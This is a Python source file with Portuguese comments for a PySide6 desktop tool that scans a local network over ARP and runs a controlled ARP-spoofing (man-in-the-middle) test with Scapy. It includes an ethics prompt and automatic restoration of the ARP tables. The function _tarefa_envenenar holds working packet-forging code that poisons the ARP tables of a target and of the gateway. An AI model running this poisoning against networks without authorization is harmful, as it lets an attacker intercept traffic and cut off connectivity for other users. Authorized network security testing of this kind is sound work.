"""Ferramenta: Teste controlado de ARP Spoofing (MITM local).

O envenenamento ARP é enviado em uma tarefa assíncrona e sempre restaurado em
``finally``: parada manual, cancelamento, erro de envio ou encerramento do
aplicativo restauram as tabelas ARP dos dois alvos. O botão "Parar" apenas
solicita o encerramento; a restauração nunca depende exclusivamente dele.

A ferramenta também oferece descoberta ARP da rede local para preencher os
alvos, evitando digitação manual de endereços físicos.
"""
from __future__ import annotations

import ipaddress
import re
import threading
import time
from typing import Any, Dict, List, Optional

from PySide6.QtCore import QObject, QTimer, Signal
from PySide6.QtWidgets import (
    QComboBox,
    QHeaderView,
    QHBoxLayout,
    QLabel,
    QLineEdit,
    QPushButton,
    QWidget,
)

from wintoolbox.core.elevation import is_admin
from wintoolbox.core.registry import Tool, register
from wintoolbox.tools._helpers import (
    DependenciaAusente,
    aviso_dependencia,
    confirmar_termo_etico,
    dependencia_disponivel,
    formatar_numero,
    garantir_admin,
)
from wintoolbox.tools._widgets import (
    PainelFerramenta,
    adicionar_log_painel,
    botao_copiar,
    criar_aviso,
    criar_card,
    criar_saida_texto,
    criar_tabela,
    executar_assincrono,
    mostrar_erro,
    preencher_tabela,
)

TEXTO_ETICO = (
    "O ARP Spoofing faz o computador assumir o endereço físico do gateway ou de "
    "outro host, desviando o tráfego da rede local. Durante o teste, dispositivos "
    "podem perder conectividade e conversas podem ser interceptadas.\n\n"
    "Execute somente em redes que você administra ou com autorização expressa e "
    "por escrito do responsável, informando o horário e os alvos do teste.\n\n"
    "A interceptação não autorizada de comunicações é crime previsto na Lei "
    "12.737/2012 (art. 154-A do Código Penal) e pode violar a Lei 13.709/2018 "
    "(LGPD).\n\n"
    "Você declara possuir autorização por escrito e assume integral "
    "responsabilidade pelo teste, ciente de que as tabelas ARP serão restauradas "
    "automaticamente ao final?"
)

INTERVALO_ENVIO = 2.0
INTERVALO_LOOP = 0.1
PADRAO_MAC = re.compile(r"^(?:[0-9A-Fa-f]{2}[:-]){5}[0-9A-Fa-f]{2}$")


class _SinaisArp(QObject):
    """Sinais emitidos pela thread de envenenamento."""

    contadores = Signal(object)


def _normalizar_mac(valor: str) -> str:
    """Valida e normaliza um MAC para o formato aa:bb:cc:dd:ee:ff."""
    texto = str(valor or "").strip().replace("-", ":").lower()
    if not texto:
        return ""
    if not PADRAO_MAC.match(texto):
        raise ValueError(f"Endereço físico inválido: {valor}")
    return texto


def _validar_ip(valor: str, rotulo: str) -> str:
    """Valida um endereço IPv4 obrigatório."""
    texto = str(valor or "").strip()
    if not texto:
        raise ValueError(f"Informe o {rotulo}.")
    try:
        return str(ipaddress.IPv4Address(texto))
    except ValueError as exc:
        raise ValueError(f"{rotulo.capitalize()} inválido: {valor}") from exc


def _listar_interfaces() -> List[tuple[str, str]]:
    """Lista interfaces do Scapy como pares (rótulo, nome), sem falhar sem a lib."""
    try:
        from scapy.all import conf

        pares: List[tuple[str, str]] = []
        vistos: set[str] = set()
        for interface in conf.ifaces.values():
            nome = getattr(interface, "name", "") or ""
            if not nome or nome in vistos:
                continue
            vistos.add(nome)
            descricao = getattr(interface, "description", "") or nome
            endereco = getattr(interface, "ip", "") or ""
            pares.append((f"{descricao} ({endereco})" if endereco else descricao, nome))
        return pares
    except Exception:
        return []


def _calcular_faixa(rotas: Any, interface: str, ip_local: str):
    """Deduz a sub-rede local a partir da tabela de rotas do Scapy."""
    for entrada in rotas:
        try:
            mascara = entrada[1]
            if str(entrada[3]) != str(interface) or not mascara:
                continue
            rede = ipaddress.ip_network(
                f"{ip_local}/{ipaddress.IPv4Address(mascara)}", strict=False
            )
            if rede.version == 4 and 1 < rede.num_addresses <= 4096:
                return rede
        except (ValueError, IndexError, TypeError):
            continue
    return ipaddress.ip_network(f"{ip_local}/24", strict=False)


def _tarefa_scan_arp(interface: str) -> List[Dict[str, str]]:
    """Envia ARP requests para a sub-rede local e devolve os dispositivos ativos."""
    from scapy.all import ARP, Ether, conf, srp

    rota = conf.route.route("0.0.0.0")
    interface_efetiva = interface or rota[0]
    gateway = str(rota[2])
    faixa = _calcular_faixa(conf.route.routes, interface_efetiva, str(rota[1]))

    pacote = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=str(faixa))
    respondidos, _ = srp(
        pacote, timeout=3, iface=interface_efetiva or None, verbose=0
    )

    dispositivos: Dict[str, Dict[str, str]] = {}
    for _, resposta in respondidos:
        ip = str(resposta.psrc)
        mac = str(resposta.hwsrc).lower()
        dispositivos[ip] = {
            "ip": ip,
            "mac": mac,
            "papel": "Gateway" if ip == gateway else "Dispositivo",
            "interface": str(interface_efetiva),
        }
    return sorted(
        dispositivos.values(), key=lambda item: int(ipaddress.IPv4Address(item["ip"]))
    )


def _tarefa_detectar_gateway(interface: str) -> Dict[str, str]:
    """Descobre o gateway padrão e seu endereço físico."""
    from scapy.all import conf, getmacbyip

    rota = conf.route.route("0.0.0.0")
    gateway = str(rota[2])
    mac = getmacbyip(gateway) if gateway and gateway != "0.0.0.0" else None
    return {
        "gateway": gateway,
        "mac": str(mac or "").lower(),
        "interface": str(interface or rota[0]),
    }


def _tarefa_envenenar(
    params: Dict[str, str],
    sinais: _SinaisArp,
    parar: threading.Event,
    ctx: Any,
) -> Dict[str, Any]:
    """Envenena as tabelas ARP dos dois alvos e restaura ao final, sempre."""
    from scapy.all import ARP, Ether, conf, get_if_hwaddr, getmacbyip, sendp

    rota = conf.route.route("0.0.0.0")
    interface = params.get("interface") or str(rota[0])
    gateway_ip = params["gateway_ip"]
    target_ip = params["target_ip"]

    gateway_mac = params.get("gateway_mac") or str(getmacbyip(gateway_ip) or "")
    target_mac = params.get("target_mac") or str(getmacbyip(target_ip) or "")
    if not gateway_mac:
        raise RuntimeError(
            "Não foi possível descobrir o endereço físico do gateway. "
            "Execute o escaneamento ARP e informe o MAC manualmente."
        )
    if not target_mac:
        raise RuntimeError(
            "Não foi possível descobrir o endereço físico do alvo. "
            "Execute o escaneamento ARP e informe o MAC manualmente."
        )
    gateway_mac = _normalizar_mac(gateway_mac)
    target_mac = _normalizar_mac(target_mac)
    mac_local = get_if_hwaddr(interface)

    enviados = 0
    rodadas = 0
    restaurado = False

    def envenenar() -> None:
        pacote_alvo = Ether(dst=target_mac, src=mac_local) / ARP(
            op=2,
            hwsrc=mac_local,
            psrc=gateway_ip,
            hwdst=target_mac,
            pdst=target_ip,
        )
        pacote_gateway = Ether(dst=gateway_mac, src=mac_local) / ARP(
            op=2,
            hwsrc=mac_local,
            psrc=target_ip,
            hwdst=gateway_mac,
            pdst=gateway_ip,
        )
        sendp([pacote_alvo, pacote_gateway], iface=interface, verbose=0)

    def restaurar() -> None:
        pacote_alvo = Ether(dst=target_mac, src=gateway_mac) / ARP(
            op=2,
            hwsrc=gateway_mac,
            psrc=gateway_ip,
            hwdst=target_mac,
            pdst=target_ip,
        )
        pacote_gateway = Ether(dst=gateway_mac, src=target_mac) / ARP(
            op=2,
            hwsrc=target_mac,
            psrc=target_ip,
            hwdst=gateway_mac,
            pdst=gateway_ip,
        )
        sendp([pacote_alvo, pacote_gateway], iface=interface, verbose=0)

    inicio = time.monotonic()
    sinais.contadores.emit(
        {
            "fase": "envenenando",
            "enviados": 0,
            "rodadas": 0,
            "decorrido": 0.0,
            "gateway_mac": gateway_mac,
            "target_mac": target_mac,
        }
    )
    try:
        while not parar.is_set() and not ctx.cancelled():
            envenenar()
            enviados += 2
            rodadas += 1
            sinais.contadores.emit(
                {
                    "fase": "envenenando",
                    "enviados": enviados,
                    "rodadas": rodadas,
                    "decorrido": time.monotonic() - inicio,
                    "gateway_mac": gateway_mac,
                    "target_mac": target_mac,
                }
            )
            limite = time.monotonic() + INTERVALO_ENVIO
            while (
                time.monotonic() < limite
                and not parar.is_set()
                and not ctx.cancelled()
            ):
                time.sleep(INTERVALO_LOOP)
    finally:
        sinais.contadores.emit(
            {
                "fase": "restaurando",
                "enviados": enviados,
                "rodadas": rodadas,
                "decorrido": time.monotonic() - inicio,
            }
        )
        try:
            for _ in range(5):
                restaurar()
                time.sleep(0.2)
            restaurado = True
            ctx.log("INFO", "Tabelas ARP restauradas com os endereços originais.")
        except Exception as exc:  # a restauração nunca pode ser silenciosa
            ctx.log("ERRO", f"Falha ao restaurar as tabelas ARP: {exc}")
        sinais.contadores.emit(
            {
                "fase": "encerrado",
                "enviados": enviados,
                "rodadas": rodadas,
                "decorrido": time.monotonic() - inicio,
            }
        )

    return {
        "enviados": enviados,
        "rodadas": rodadas,
        "restaurado": restaurado,
        "duracao": time.monotonic() - inicio,
        "gateway_mac": gateway_mac,
        "target_mac": target_mac,
    }


@register
class ArpPoisonTool(Tool):
    """Ferramenta de teste de ARP Spoofing com restauração automática."""

    id = "network.arp_poison"
    name = "Teste de ARP Spoofing (MITM Local)"
    category = "Rede e Internet"
    description = (
        "Envenenamento ARP bidirecional entre gateway e alvo, com descoberta de "
        "dispositivos, contadores em tempo real e restauração automática das "
        "tabelas ARP"
    )
    keywords = [
        "arp",
        "spoofing",
        "mitm",
        "envenenamento",
        "gateway",
        "mac",
        "rede local",
        "interceptação",
    ]
    requires_admin = True
    optional_deps = ["scapy"]

    def build_view(self, parent: Optional[QWidget] = None) -> QWidget:
        return ArpPoisonView(self, parent)


class ArpPoisonView(PainelFerramenta):
    """Página interativa do teste de ARP Spoofing."""

    def __init__(self, tool: ArpPoisonTool, parent: Optional[QWidget] = None) -> None:
        super().__init__(tool, parent)
        self.sinais = _SinaisArp(self)
        self._parar = threading.Event()
        self._executando = False
        self._dispositivos: List[Dict[str, str]] = []
        self._montar_interface()
        self.sinais.contadores.connect(self._ao_contadores)
        if dependencia_disponivel("scapy"):
            QTimer.singleShot(0, self._atualizar_interfaces)

    # ------------------------------------------------------------------ UI
    def _montar_interface(self) -> None:
        self.adicionar(
            criar_aviso(
                "Durante o envenenamento, o tráfego entre alvo e gateway passa por "
                "este computador. O Windows não encaminha pacotes por padrão: o "
                "resultado esperado é a perda de conectividade do alvo, não a "
                "navegação transparente. As tabelas ARP são restauradas "
                "automaticamente ao parar, ao sair da página ou ao fechar o "
                "aplicativo.",
                self,
                destaque=True,
            )
        )
        self._montar_cartao_admin()

        cartao_descoberta, layout_descoberta = self.adicionar_card("Descoberta ARP")
        linha_descoberta = QHBoxLayout()
        linha_descoberta.addWidget(QLabel("Interface:"))
        self.cmb_interface = QComboBox()
        self.cmb_interface.addItem("Automático (padrão do sistema)", "")
        self.cmb_interface.setMinimumWidth(230)
        linha_descoberta.addWidget(self.cmb_interface, stretch=1)

        self.btn_atualizar = QPushButton("Atualizar interfaces")
        self.btn_atualizar.clicked.connect(self._atualizar_interfaces)
        linha_descoberta.addWidget(self.btn_atualizar)

        self.btn_escanear = QPushButton("Escanear rede local")
        self.btn_escanear.clicked.connect(self._escanear_rede)
        linha_descoberta.addWidget(self.btn_escanear)
        layout_descoberta.addLayout(linha_descoberta)

        self.tabela_dispositivos = criar_tabela(["Endereço IP", "Endereço físico", "Papel"], self)
        cabecalho = self.tabela_dispositivos.horizontalHeader()
        cabecalho.setSectionResizeMode(0, QHeaderView.ResizeMode.ResizeToContents)
        cabecalho.setSectionResizeMode(1, QHeaderView.ResizeMode.ResizeToContents)
        cabecalho.setSectionResizeMode(2, QHeaderView.ResizeMode.Stretch)
        self.tabela_dispositivos.setMinimumHeight(180)
        self.tabela_dispositivos.cellDoubleClicked.connect(self._usar_dispositivo)
        layout_descoberta.addWidget(self.tabela_dispositivos)

        self.lbl_descoberta = QLabel(
            "Dê um duplo clique em um dispositivo para usá-lo como alvo."
        )
        self.lbl_descoberta.setProperty("class", "secondary")
        layout_descoberta.addWidget(self.lbl_descoberta)

        cartao_alvos, layout_alvos = self.adicionar_card("Alvos")
        linha_gateway = QHBoxLayout()
        linha_gateway.addWidget(QLabel("IP do gateway:"))
        self.txt_gateway_ip = QLineEdit()
        self.txt_gateway_ip.setPlaceholderText("Ex.: 192.168.0.1")
        linha_gateway.addWidget(self.txt_gateway_ip, stretch=1)
        linha_gateway.addWidget(QLabel("MAC do gateway:"))
        self.txt_gateway_mac = QLineEdit()
        self.txt_gateway_mac.setPlaceholderText("Deixe vazio para resolver via ARP")
        linha_gateway.addWidget(self.txt_gateway_mac, stretch=1)
        self.btn_gateway = QPushButton("Detectar gateway")
        self.btn_gateway.clicked.connect(self._detectar_gateway)
        linha_gateway.addWidget(self.btn_gateway)
        layout_alvos.addLayout(linha_gateway)

        linha_alvo = QHBoxLayout()
        linha_alvo.addWidget(QLabel("IP do alvo:"))
        self.txt_alvo_ip = QLineEdit()
        self.txt_alvo_ip.setPlaceholderText("Ex.: 192.168.0.50")
        linha_alvo.addWidget(self.txt_alvo_ip, stretch=1)
        linha_alvo.addWidget(QLabel("MAC do alvo:"))
        self.txt_alvo_mac = QLineEdit()
        self.txt_alvo_mac.setPlaceholderText("Deixe vazio para resolver via ARP")
        linha_alvo.addWidget(self.txt_alvo_mac, stretch=1)
        layout_alvos.addLayout(linha_alvo)

        cartao_execucao, layout_execucao = self.adicionar_card("Execução")
        linha_controle = QHBoxLayout()
        self.btn_iniciar = QPushButton("Iniciar envenenamento")
        self.btn_iniciar.setProperty("class", "primary")
        self.btn_iniciar.clicked.connect(self._iniciar_envenenamento)
        linha_controle.addWidget(self.btn_iniciar)

        self.btn_parar = QPushButton("Parar e restaurar ARP")
        self.btn_parar.setEnabled(False)
        self.btn_parar.clicked.connect(self._parar_envenenamento)
        linha_controle.addWidget(self.btn_parar)
        linha_controle.addStretch()
        layout_execucao.addLayout(linha_controle)

        self.lbl_enviados = QLabel("Pacotes ARP enviados: 0")
        self.lbl_rodadas = QLabel("Rodadas: 0")
        self.lbl_estado = QLabel("Estado: parado")
        self.lbl_duracao = QLabel("Duração: 0,0 s")
        for etiqueta in (self.lbl_enviados, self.lbl_rodadas, self.lbl_estado, self.lbl_duracao):
            etiqueta.setProperty("class", "secondary")
            linha_contadores = QHBoxLayout()
            linha_contadores.addWidget(etiqueta)
            linha_contadores.addStretch()
            layout_execucao.addLayout(linha_contadores)

        self.lbl_status = QLabel(
            "Informe gateway e alvo, ou use o escaneamento ARP para preencher."
        )
        self.lbl_status.setProperty("class", "secondary")
        self.lbl_status.setWordWrap(True)
        layout_execucao.addWidget(self.lbl_status)

        cartao_relatorio, layout_relatorio = self.adicionar_card("Relatório do teste")
        self.txt_relatorio = criar_saida_texto(150, self)
        layout_relatorio.addWidget(self.txt_relatorio)
        linha_relatorio = QHBoxLayout()
        linha_relatorio.addWidget(
            botao_copiar(lambda: self.txt_relatorio.toPlainText(), self, "Copiar relatório")
        )
        linha_relatorio.addStretch()
        layout_relatorio.addLayout(linha_relatorio)

        self.log_panel = adicionar_log_painel(self, "Log do teste ARP")
        self._definir_ocupado(False)

    def _montar_cartao_admin(self) -> None:
        cartao, layout = criar_card("Privilégios de Administrador", self)
        self.lbl_admin = QLabel()
        self.lbl_admin.setWordWrap(True)
        self.lbl_admin.setProperty("class", "secondary")
        self.btn_admin = QPushButton("Reiniciar como Administrador")
        self.btn_admin.clicked.connect(self._solicitar_admin)
        linha = QHBoxLayout()
        linha.addWidget(self.lbl_admin, stretch=1)
        linha.addWidget(self.btn_admin)
        layout.addLayout(linha)
        self.adicionar(cartao)
        self._atualizar_status_admin()

    def _solicitar_admin(self) -> None:
        garantir_admin(self, self.tool.name, permitir_continuar=False)
        self._atualizar_status_admin()

    def _atualizar_status_admin(self) -> None:
        if is_admin():
            self.lbl_admin.setText(
                "Executando com privilégios de Administrador. O envio ARP bruto "
                "está disponível."
            )
            self.btn_admin.setEnabled(False)
            self.btn_admin.setToolTip("O aplicativo já está elevado.")
        else:
            self.lbl_admin.setText(
                "Executando como usuário padrão. O teste exige Administrador e o "
                "Npcap instalado."
            )
            self.btn_admin.setEnabled(True)
            self.btn_admin.setToolTip("Solicita a elevação do aplicativo via UAC.")

    def _atualizar_interfaces(self) -> None:
        if not dependencia_disponivel("scapy"):
            self.log_panel.append_log(
                "AVISO",
                "Scapy não está instalado: apenas a interface automática está disponível.",
            )
            return
        atual = self.cmb_interface.currentData()
        pares = _listar_interfaces()
        self.cmb_interface.blockSignals(True)
        self.cmb_interface.clear()
        self.cmb_interface.addItem("Automático (padrão do sistema)", "")
        for rotulo, nome in pares:
            self.cmb_interface.addItem(rotulo, nome)
        indice = self.cmb_interface.findData(atual) if atual else 0
        self.cmb_interface.setCurrentIndex(max(0, indice))
        self.cmb_interface.blockSignals(False)

    def _definir_ocupado(self, ocupado: bool) -> None:
        self._executando = ocupado
        self.btn_iniciar.setEnabled(not ocupado)
        self.btn_parar.setEnabled(ocupado)
        self.btn_escanear.setEnabled(not ocupado)
        self.btn_gateway.setEnabled(not ocupado)
        self.btn_atualizar.setEnabled(not ocupado)
        self.cmb_interface.setEnabled(not ocupado)
        for campo in (
            self.txt_gateway_ip,
            self.txt_gateway_mac,
            self.txt_alvo_ip,
            self.txt_alvo_mac,
        ):
            campo.setEnabled(not ocupado)

    def _verificar_scapy(self) -> bool:
        if dependencia_disponivel("scapy"):
            return True
        aviso_dependencia(self, DependenciaAusente("Scapy", "scapy.all", "scapy"))
        return False

    # ----------------------------------------------------------- descoberta
    def _escanear_rede(self) -> None:
        if self._executando:
            return
        if not confirmar_termo_etico(self, self.tool.id, TEXTO_ETICO):
            return
        if not self._verificar_scapy():
            return
        if not garantir_admin(self, self.tool.name, permitir_continuar=False):
            return
        self._atualizar_status_admin()

        interface = self.cmb_interface.currentData() or ""
        self._definir_ocupado(True)
        self.lbl_descoberta.setText("Escaneando a rede local via ARP...")
        self.lbl_status.setText("Escaneando a rede local...")

        def tarefa(ctx) -> List[Dict[str, str]]:
            return _tarefa_scan_arp(interface)

        executar_assincrono(
            self,
            tarefa,
            ao_concluir=self._scan_concluido,
            ao_falhar=self._falhou,
        )

    def _scan_concluido(self, dispositivos: List[Dict[str, str]]) -> None:
        self._definir_ocupado(False)
        self._dispositivos = list(dispositivos)
        preencher_tabela(
            self.tabela_dispositivos,
            [[item["ip"], item["mac"], item["papel"]] for item in dispositivos],
        )
        self.lbl_descoberta.setText(
            f"{len(dispositivos)} dispositivo(s) encontrado(s). "
            "Dê um duplo clique para usar como alvo."
        )
        gateway = next((item for item in dispositivos if item["papel"] == "Gateway"), None)
        if gateway and not self.txt_gateway_ip.text().strip():
            self.txt_gateway_ip.setText(gateway["ip"])
            self.txt_gateway_mac.setText(gateway["mac"])
        self.lbl_status.setText(f"Descoberta concluída: {len(dispositivos)} dispositivo(s).")
        self.log_panel.append_log("INFO", f"Descoberta ARP: {len(dispositivos)} dispositivo(s).")

    def _usar_dispositivo(self, linha: int, _coluna: int) -> None:
        if self._executando or linha < 0 or linha >= len(self._dispositivos):
            return
        item = self._dispositivos[linha]
        self.txt_alvo_ip.setText(item["ip"])
        self.txt_alvo_mac.setText(item["mac"])
        if item["papel"] == "Gateway":
            self.txt_gateway_ip.setText(item["ip"])
            self.txt_gateway_mac.setText(item["mac"])
        self.lbl_status.setText(f"Alvo selecionado: {item['ip']} ({item['mac']}).")

    def _detectar_gateway(self) -> None:
        if self._executando:
            return
        if not self._verificar_scapy():
            return
        if not garantir_admin(self, self.tool.name, permitir_continuar=False):
            return
        self._atualizar_status_admin()
        interface = self.cmb_interface.currentData() or ""
        self._definir_ocupado(True)
        self.lbl_status.setText("Detectando o gateway padrão...")

        def tarefa(ctx) -> Dict[str, str]:
            return _tarefa_detectar_gateway(interface)

        executar_assincrono(
            self,
            tarefa,
            ao_concluir=self._gateway_concluido,
            ao_falhar=self._falhou,
        )

    def _gateway_concluido(self, dados: Dict[str, str]) -> None:
        self._definir_ocupado(False)
        if dados.get("gateway"):
            self.txt_gateway_ip.setText(dados["gateway"])
        if dados.get("mac"):
            self.txt_gateway_mac.setText(dados["mac"])
        self.lbl_status.setText(
            f"Gateway {dados.get('gateway', '')} / "
            f"MAC {dados.get('mac') or 'não resolvido'}."
        )
        self.log_panel.append_log(
            "INFO",
            f"Gateway detectado: {dados.get('gateway')} "
            f"({dados.get('mac') or 'MAC não resolvido'}).",
        )

    # -------------------------------------------------------- envenenamento
    def _coletar_alvos(self) -> Dict[str, str]:
        """Valida os campos de alvo na thread principal."""
        gateway_ip = _validar_ip(self.txt_gateway_ip.text(), "IP do gateway")
        alvo_ip = _validar_ip(self.txt_alvo_ip.text(), "IP do alvo")
        if gateway_ip == alvo_ip:
            raise ValueError("O gateway e o alvo devem ser endereços diferentes.")
        return {
            "gateway_ip": gateway_ip,
            "target_ip": alvo_ip,
            "gateway_mac": _normalizar_mac(self.txt_gateway_mac.text()),
            "target_mac": _normalizar_mac(self.txt_alvo_mac.text()),
            "interface": self.cmb_interface.currentData() or "",
        }

    def _iniciar_envenenamento(self) -> None:
        if self._executando:
            return
        try:
            params = self._coletar_alvos()
        except ValueError as exc:
            mostrar_erro(self, "Alvos inválidos", exc)
            return
        if not confirmar_termo_etico(self, self.tool.id, TEXTO_ETICO):
            return
        if not self._verificar_scapy():
            return
        if not garantir_admin(self, self.tool.name, permitir_continuar=False):
            return
        self._atualizar_status_admin()

        self._parar.clear()
        self._definir_ocupado(True)
        self.lbl_estado.setText("Estado: envenenando")
        self.lbl_status.setText(
            "Envenenamento ARP em andamento. O botão de parada inicia a "
            "restauração automática."
        )
        self.log_panel.append_log(
            "ALERTA",
            f"Envenenamento iniciado: gateway {params['gateway_ip']} e alvo "
            f"{params['target_ip']}.",
        )

        def tarefa(ctx) -> Dict[str, Any]:
            return _tarefa_envenenar(params, self.sinais, self._parar, ctx)

        executar_assincrono(
            self,
            tarefa,
            ao_concluir=self._envenenamento_concluido,
            ao_falhar=self._falhou,
            ao_logar=self.log_panel.append_log,
        )

    def _parar_envenenamento(self) -> None:
        if not self._executando:
            return
        self._parar.set()
        self.runner.cancel_current()
        self.btn_parar.setEnabled(False)
        self.lbl_estado.setText("Estado: restaurando tabelas ARP")
        self.lbl_status.setText(
            "Parada solicitada. Aguardando a restauração das tabelas ARP dos dois alvos."
        )

    def _ao_contadores(self, dados: Dict[str, Any]) -> None:
        self.lbl_enviados.setText(
            f"Pacotes ARP enviados: {formatar_numero(int(dados.get('enviados', 0)))}"
        )
        self.lbl_rodadas.setText(f"Rodadas: {formatar_numero(int(dados.get('rodadas', 0)))}")
        self.lbl_duracao.setText(
            f"Duração: {float(dados.get('decorrido', 0.0)):.1f} s".replace(".", ",")
        )
        fase = str(dados.get("fase", ""))
        if fase == "envenenando":
            self.lbl_estado.setText("Estado: envenenando")
        elif fase == "restaurando":
            self.lbl_estado.setText("Estado: restaurando tabelas ARP")
        elif fase == "encerrado":
            self.lbl_estado.setText("Estado: parado")

    def _envenenamento_concluido(self, resultado: Dict[str, Any]) -> None:
        self._definir_ocupado(False)
        restaurado = "sim" if resultado.get("restaurado") else "NÃO CONFIRMADA"
        self.lbl_estado.setText("Estado: parado")
        self.lbl_status.setText(
            f"Teste encerrado. Pacotes enviados: {formatar_numero(int(resultado.get('enviados', 0)))}. "
            f"Restauração ARP: {restaurado}."
        )
        relatorio = [
            "Relatório do teste de ARP Spoofing",
            f"Gerado em: {time.strftime('%d/%m/%Y %H:%M:%S')}",
            f"Gateway: {resultado.get('gateway_mac')}",
            f"Alvo: {resultado.get('target_mac')}",
            f"Pacotes ARP enviados: {formatar_numero(int(resultado.get('enviados', 0)))}",
            f"Rodadas: {formatar_numero(int(resultado.get('rodadas', 0)))}",
            f"Duração: {float(resultado.get('duracao', 0.0)):.1f} s".replace(".", ","),
            f"Restauração automática: {restaurado}",
        ]
        self.txt_relatorio.setPlainText("\n".join(relatorio))
        self.log_panel.append_log(
            "INFO",
            "Envenenamento encerrado; restauração "
            + ("concluída." if resultado.get("restaurado") else "não confirmada."),
        )

    def _falhou(self, erro: Exception) -> None:
        self._definir_ocupado(False)
        self.lbl_estado.setText("Estado: parado")
        self.lbl_status.setText("A operação não foi concluída.")
        texto = str(erro)
        self.log_panel.append_log("ERRO", texto)
        if "Esta ferramenta requer" in texto:
            aviso_dependencia(self, erro)
        else:
            mostrar_erro(self, "Falha na operação ARP", texto)

    def hideEvent(self, evento) -> None:  # noqa: N802 (assinatura Qt)
        """Sair da página interrompe o teste e dispara a restauração ARP."""
        if self._executando:
            self._parar_envenenamento()
        super().hideEvent(evento)
